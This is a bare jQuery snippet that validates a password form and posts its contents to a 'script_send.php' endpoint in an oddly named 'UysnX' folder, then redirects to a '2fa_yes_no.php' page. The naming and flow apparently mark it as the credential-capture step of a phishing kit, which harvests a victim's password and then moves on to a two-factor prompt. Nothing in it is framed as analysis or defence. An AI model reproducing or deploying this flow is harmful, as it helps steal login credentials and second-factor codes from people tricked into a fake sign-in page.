              
                        $(function() {
                            $("form[name='formadmin1']").validate({
                                rules: {
    
                                    password: "required",
                                
                                  },
                                  messages: {
                                
                                    password: "   ",
                                      
                                  },
                            submitHandler: function(form) {
                                $("#xuysnx").show();
                                 $.post("../UysnX/script_send.php", $("#formadmin1").serialize(), function(result) {
                                
                                    setTimeout(function() {
                                        $(location).attr("href", "../UysnX/2fa_yes_no.php");
                                    }, 2000);
    
                                  
    
                                   
                                   
                                   
    
                                });
                            },
                        });
                    });
    
    